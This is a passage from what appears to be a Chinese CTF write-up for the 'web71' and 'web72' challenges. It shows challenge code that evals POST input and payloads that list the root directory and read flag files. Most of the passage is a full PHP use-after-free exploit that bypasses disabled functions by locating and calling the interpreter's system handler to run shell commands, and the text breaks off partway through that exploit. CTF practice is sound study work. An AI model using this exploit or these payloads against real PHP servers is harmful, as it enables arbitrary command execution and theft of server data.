invoke__">var_export</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;/&#x27;</span>));<span class="keyword">exit</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">#array ( 0 =&gt; &#x27;.&#x27;, 1 =&gt; &#x27;..&#x27;, 2 =&gt; &#x27;.dockerenv&#x27;, 3 =&gt; &#x27;bin&#x27;, 4 =&gt; &#x27;dev&#x27;, 5 =&gt; &#x27;etc&#x27;, 6 =&gt; &#x27;flag.txt&#x27;, 7 =&gt; &#x27;home&#x27;, 8 =&gt; &#x27;lib&#x27;, 9 =&gt; &#x27;media&#x27;, 10 =&gt; &#x27;mnt&#x27;, 11 =&gt; &#x27;opt&#x27;, 12 =&gt; &#x27;proc&#x27;, 13 =&gt; &#x27;root&#x27;, 14 =&gt; &#x27;run&#x27;, 15 =&gt; &#x27;sbin&#x27;, 16 =&gt; &#x27;srv&#x27;, 17 =&gt; &#x27;sys&#x27;, 18 =&gt; &#x27;tmp&#x27;, 19 =&gt; &#x27;usr&#x27;, 20 =&gt; &#x27;var&#x27;, )</span></span><br></pre></td></tr></table></figure><p>​之后就</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">include</span>(<span class="string">&quot;/flag.txt&quot;</span>);<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><h1 id="web72"><a class="markdownIt-Anchor" href="#web72">#</a> Web72：</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$s</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">        <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>​scandir 被禁了，这里没什么思路，不过，这里有大佬通过 glob 伪协议读取了根目录文件名：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;<span class="keyword">echo</span> <span class="variable">$f</span>.<span class="string">&quot;    &quot;</span> ;&#125;<span class="keyword">exit</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">#bin dev etc flag0.txt home lib media mnt opt proc root run sbin srv sys tmp usr var </span></span><br></pre></td></tr></table></figure><p>​通过 include 读取文件的时候发现没有权限，先列一些读取文件的函数吧：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">readfile</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;example.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);<span class="variable">$content</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$file</span>, <span class="title function_ invoke__">filesize</span>(<span class="string">&quot;example.txt&quot;</span>));<span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="variable">$fileContents</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;example.txt&quot;</span>);</span><br></pre></td></tr></table></figure><p>​之后就是利用 uaf 脚本进行命令执行了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">pwn</span>(<span class="string">&quot;ls /;cat /flag0.txt&quot;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$backtrace</span>; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">            <span class="variable">$backtrace</span> = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;<span class="title function_ invoke__">getTrace</span>(); <span class="comment"># ;)</span></span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123; <span class="comment"># PHP &gt;= 7.4</span></span><br><span class="line">                <span class="variable">$backtrace</span> = <span class="title function_ invoke__">debug_backtrace</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;%c&#x27;</span>,<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;%c&#x27;</span>,<span class="variable">$v</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="variable">$e_phoff</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">                <span class="comment"># handle pie</span></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;constant&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"> </span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;bin2hex&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123; <span class="comment"># ELF header</span></span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123; <span class="comment"># system</span></span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params"><span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line">        <span class="comment"># str_shuffle prevents opcache string interning</span></span><br><span class="line">        <span class="variable">$arg</span> = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line">        <span class="variable">$vuln</span> = <span class="keyword">new</span> <span class="title class_">Vuln</span>();</span><br><span class="line">        <span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; <span class="comment"># increase this value if UAF fails</span></span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="title function_ invoke__">trigger_uaf</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> <span class="title class_">Helper</span>;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">79</span> || <span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># leaks</span></span><br><span class="line">    <span class="variable">$closure_handlers</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># fake value</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># fake reference</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$closure_obj</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$binary_leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = <span class="title function_ invoke__">get_binary_base</span>(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = <span class="title function_ invoke__">parse_elf</span>(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = <span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = <span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># fake closure object</span></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># pwn</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span 